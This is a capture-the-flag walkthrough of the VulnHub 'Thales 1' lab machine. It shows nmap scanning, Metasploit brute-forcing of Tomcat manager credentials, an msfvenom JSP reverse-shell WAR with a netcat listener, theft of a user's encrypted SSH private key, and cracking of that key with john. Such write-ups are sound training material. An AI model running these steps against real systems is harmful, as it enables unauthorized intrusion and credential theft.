# Thales 1 - VulnHub

Reference: [Thales](https://www.vulnhub.com/entry/thales-1,749/)

# Mapping

Searching for the target device:

```
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ nmap 172.20.10.4/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-24 16:18 CET
Nmap scan report for 172.20.10.1
Host is up (0.0049s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
49152/tcp open  unknown
62078/tcp open  iphone-sync

Nmap scan report for 172.20.10.4
Host is up (0.00093s latency).
All 1000 scanned ports on 172.20.10.4 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 172.20.10.5
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

```
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ nmap -A 172.20.10.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-24 16:19 CET
Nmap scan report for 172.20.10.5
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8c:19:ab:91:72:a5:71:d8:6d:75:1d:8f:65:df:e1:32 (RSA)
|   256 90:6e:a0:ee:d5:29:6c:b9:7b:05:db:c6:82:5c:19:bf (ECDSA)
|_  256 54:4d:7b:e8:f9:7f:21:34:3e:ed:0f:d9:fe:93:bf:00 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.52
|_http-title: Apache Tomcat/9.0.52
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
```

# Access to the Tomcat Server

The Tomcat server manager is protected by a password that we will be brute forcing using MS.

```
msf6 > use auxiliary/scanner/http/tomcat_enum
msf6 auxiliary(scanner/http/tomcat_enum) > set TARGETURI manager
TARGETURI => http://172.20.10.5:8080/manager
msf6 auxiliary(scanner/http/tomcat_enum) > set RHOSTS http://172.20.10.5:8080
RHOSTS => http://172.20.10.5:8080
msf6 auxiliary(scanner/http/tomcat_enum) > run

[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Checking j_security_check...
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Server returned: 302
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'admin'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat admin found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'manager'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat manager found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'role1'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat role1 found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'role'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat role found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'root'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat root found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'tomcat'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat tomcat found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'both'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat both found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'QCC'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat QCC found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'j2deployer'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat j2deployer found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'ovwebusr'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat ovwebusr found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'cxsdk'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat cxsdk found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'ADMIN'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat ADMIN found
[*] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat - Trying name: 'xampp'
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Apache Tomcat xampp found
[+] http://172.20.10.5:8080/http:/172.20.10.5:8080/manager - Users found: ADMIN, QCC, admin, both, cxsdk, j2deployer, manager, ovwebusr, role, role1, root, tomcat, xampp
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now that we have some username let's crack the password using MS.

```
msf6 auxiliary(scanner/http/tomcat_enum) > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST example.local
VHOST => example.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set username tomcat
username => tomcat
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS http://172.20.10.5:8080
RHOSTS => http://172.20.10.5:8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
[-] 172.20.10.5:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 172.20.10.5:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[+] 172.20.10.5:8080 - Login Successful: tomcat:role1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Thus we got the pair:

```
login: tomcat
password: role1
```

The `tomcat` user has the rights to publish apps on the Apache Tomcat server, lets do so with a corrupted file that will open a reverse shell.

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.20.10.4 LPORT=9999 -f war > reverse.war
```

In another prompt we launch a NetCat instance to connect to that reverse shell

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ nc -nlvp 9999
```

When the reverse shell is deployed just curl it on the right URL to enable it. The NetCat instance should connect automatically.

Now switch to a bash interface:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Search for the flages

```bash
find / -type f -name "user.txt" 2>/dev/null
/home/thales/user.txt
find / -type f -name "root.txt" 2>/dev/null
```

```bash
tomcat@miletus:/home/thales$ ls -la
ls -la
total 52
drwxr-xr-x 6 thales thales 4096 Oct 14 2021 .
drwxr-xr-x 3 root root 4096 Aug 15 2021 ..
-rw------- 1 thales thales 457 Oct 14 2021 .bash_history
-rw-r--r-- 1 thales thales 220 Apr 4 2018 .bash_logout
-rw-r--r-- 1 thales thales 3771 Apr 4 2018 .bashrc
drwx------ 2 thales thales 4096 Aug 15 2021 .cache
drwx------ 3 thales thales 4096 Aug 15 2021 .gnupg
drwxrwxr-x 3 thales thales 4096 Aug 15 2021 .local
-rw-r--r-- 1 root root 107 Oct 14 2021 notes.txt
-rw-r--r-- 1 thales thales 807 Apr 4 2018 .profile
-rw-r--r-- 1 root root 66 Aug 15 2021 .selected_editor
drwxrwxrwx 2 thales thales 4096 Aug 16 2021 .ssh
-rw-r--r-- 1 thales thales 0 Oct 14 2021 .sudo_as_admin_successful
-rw------- 1 thales thales 33 Aug 15 2021 user.txt
```

```bash
tomcat@miletus:/home/thales/.ssh$ ls -la
ls -la
total 16
drwxrwxrwx 2 thales thales 4096 Aug 16 2021 .
drwxr-xr-x 6 thales thales 4096 Oct 14 2021 ..
-rw-r--r-- 1 thales thales 1766 Aug 16 2021 id_rsa
-rw-r--r-- 1 thales thales 396 Aug 16 2021 id_rsa.pub
```

```bash
tomcat@miletus:/home/thales/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6103FE9ABCD5EF41F96C07F531922AAF

ZMlKhm2S2Cqbj+k3h8MgQFr6oG4CBKqF1NfT04fJPs1xbXe00aSdS+QgIbSaKWMh
+/ILeS/r8rFUt9isW2QAH7JYEWBgR4Z/9KSMSUd1aEyjxz7FpZj2cL1Erj9wK9ZA
InMmkm7xAKOWKwLTJeMS3GB4X9AX9ef/Ijmxx/cvvIauK5G2jPRyGSazMjK0QcwX
pkwnm4EwXPDiktkwzg15RwIhJdZBbrMj7WW9kt0CF9P754mChdIWzHrxYhCUIfWd
rHbDYTKmfL18LYhHaj9ZklkZjb8li8JIPvnJDcnLsCY+6X1xB9dqbUGGtSHNnHiL
rmrOSfI7RYt9gCgMtFimYRaS7gFuvZE/NmmIUJkH3Ccv1mIj3wT1TCtvREv+eKgf
/nj+3A6ZSQKFdlm22YZBilE4npxGOC03s81Rbvg90cxOhxYGTZMu/jU9ebUT2HAh
o1B972ZAWj3m5sDZRiQ+wTGqwFBFxF9EPia6sRM/tBKaigIElDSyvz1C46mLTmBS
f8KNwx5rNXkNM7dYX1Sykg0RreKO1weYAA0yQSHCY+iJTIf81CuDcgOIYRywHIPU
9rI20K910cLLo+ySa7O4KDcmIL1WCnGbrD4PwupQ68G2YG0ZOOIrwE9efkpwXPCR
Vi2TO2Zut8x6ZEFjz4d3aWIzWtf1IugQrsmBK+akRLBPjQVy/LyApqvV+tYfQelV
v9pEKMxR5f1gFmZpTbZ6HDHmEO4Y7gXvUXphjW5uijYemcyGx0HSqCSER7y7+phA
h0NEJHSBSdMpvoS7oSIxC0qe4QsSwITYtJs5fKuvJejRGpoh1O2HE+etITXlFffm
2J1fdQgPo+qbOVSMGmkITfTBDh1ODG7TZYAq8OLyEh/yiALoZ8T1AEeAJev5hON5
PUUP8cxX4SH43lnsmIDjn8M+nEsMEWVZzvaqo6a2Sfa/SEdxq8ZIM1Nm8fLuS8N2
GCrvRmCd7H+KrMIY2Y4QuTFR1etulbBPbmcCmpsXlj496bE7n5WwILLw3Oe4IbZm
ztB5WYAww6yyheLmgU4WkKMx2sOWDWZ/TSEP0j9esOeh2mOt/7Grrhn3xr8zqnCY
i4utbnsjL4U7QVaa+zWz6PNiShH/LEpuRu2lJWZU8mZ7OyUyx9zoPRWEmz/mhOAb
jRMSyfLNFggfzjswgcbwubUrpX2Gn6XMb+MbTY3CRXYqLaGStxUtcpMdpj4QrFLP
eP/3PGXugeJi8anYMxIMc3cJR03EktX5Cj1TQRCjPWGoatOMh02akMHvVrRKGG1d
/sMTTIDrlYlrEAfQXacjQF0gzqxy7jQaUc0k4Vq5iWggjXNV2zbR/YYFwUzgSjSe
SNZzz4AMwRtlCWxrdoD/exvCeKWuObPlajTI3MaUoxPjOvhQK55XWIcg+ogo9X5x
B8XDQ3qW6QJLFELXpAnl5zW5cAHXAVzCp+VtgQyrPU04gkoOrlrj5u22UU8giTdq
nLypW+J5rGepKGrklOP7dxEBbQiy5XDm/K/22r9y+Lwyl38LDF2va22szGoW/oT+
8eZHEOYASwoSKng9UEhNvX/JpsGig5sAamBgG1sV9phyR2Y9MNb/698hHyULD78C
-----END RSA PRIVATE KEY-----
```

Create a file name id_rsa on your host and copy the entire content of id_rsa in it

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ /usr/share/john/ssh2john.py id_rsa > translate.txt
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ cat translate.txt
id_rsa:$sshng$1$16$6103FE9ABCD5EF41F96C07F531922AAF$1200$64c94a866d92d82a9b8fe93787c320405afaa06e0204aa85d4d7d3d387c93ecd716d77b4d1a49d4be42021b49a296321fbf20b792febf2b154b7d8ac5b64001fb25811606047867ff4a48c494775684ca3c73ec5a598f670bd44ae3f702bd640227326926ef100a3962b02d325e312dc60785fd017f5e7ff2239b1c7f72fbc86ae2b91b68cf4721926b33232b441cc17a64c279b81305cf0e292d930ce0d7947022125d6416eb323ed65bd92dd0217d3fbe7898285d216cc7af162109421f59dac76c36132a67cbd7c2d88476a3f599259198dbf258bc2483ef9c90dc9cbb0263ee97d7107d76a6d4186b521cd9c788bae6ace49f23b458b7d80280cb458a6611692ee016ebd913f366988509907dc272fd66223df04f54c2b6f444bfe78a81ffe78fedc0e994902857659b6d986418a51389e9c46382d37b3cd516ef83dd1cc4e8716064d932efe353d79b513d87021a3507def66405a3de6e6c0d946243ec131aac05045c45f443e26bab1133fb4129a8a02049434b2bf3d42e3a98b4e60527fc28dc31e6b35790d33b7585f54b2920d11ade28ed70798000d324121c263e8894c87fcd42b83720388611cb01c83d4f6b236d0af75d1c2cba3ec926bb3b828372620bd560a719bac3e0fc2ea50ebc1b6606d1938e22bc04f5e7e4a705cf091562d933b666eb7cc7a644163cf87776962335ad7f522e810aec9812be6a444b04f8d0572fcbc80a6abd5fad61f41e955bfda4428cc51e5fd601666694db67a1c31e610ee18ee05ef517a618d6e6e8a361e99cc86c741d2a8248447bcbbfa984087434424748149d329be84bba122310b4a9ee10b12c084d8b49b397cabaf25e8d11a9a21d4ed8713e7ad2135e515f7e6d89d5f75080fa3ea9b39548c1a69084df4c10e1d4e0c6ed365802af0e2f2121ff28802e867c4f500478025ebf984e3793d450ff1cc57e121f8de59ec9880e39fc33e9c4b0c116559cef6aaa3a6b649f6bf484771abc648335366f1f2ee4bc376182aef46609dec7f8aacc218d98e10b93151d5eb6e95b04f6e67029a9b17963e3de9b13b9f95b020b2f0dce7b821b666ced079598030c3acb285e2e6814e1690a331dac3960d667f4d210fd23f5eb0e7a1da63adffb1abae19f7c6bf33aa70988b8bad6e7b232f853b41569afb35b3e8f3624a11ff2c4a6e46eda5256654f2667b3b2532c7dce83d15849b3fe684e01b8d1312c9f2cd16081fce3b3081c6f0b9b52ba57d869fa5cc6fe31b4d8dc245762a2da192b7152d72931da63e10ac52cf78fff73c65ee81e262f1a9d833120c737709474dc492d5f90a3d534110a33d61a86ad38c874d9a90c1ef56b44a186d5dfec3134c80eb95896b1007d05da723405d20ceac72ee341a51cd24e15ab98968208d7355db36d1fd8605c14ce04a349e48d673cf800cc11b65096c6b7680ff7b1bc278a5ae39b3e56a34c8dcc694a313e33af8502b9e57588720fa8828f57e7107c5c3437a96e9024b1442d7a409e5e735b97001d7015cc2a7e56d810cab3d4d38824a0eae5ae3e6edb6514f2089376a9cbca95be279ac67a9286ae494e3fb7711016d08b2e570e6fcaff6dabf72f8bc32977f0b0c5daf6b6daccc6a16fe84fef1e64710e6004b0a122a783d50484dbd7fc9a6c1a2839b006a60601b5b15f6987247663d30d6ffebdf211f250b0fbf02
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/Thales]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt translate.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06 (id_rsa)
1g 0:00:00:01 DONE (2023-12-25 00:37) 0.9615g/s 2749Kp/s 2749Kc/s 2749KC/s vodka1420..vodka\*rox
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Thus we got the pair:

```
login: thales
password: vodka06
```

```bash
tomcat@miletus:/home/thales$ su thales
su thales
Password: vodka06
```
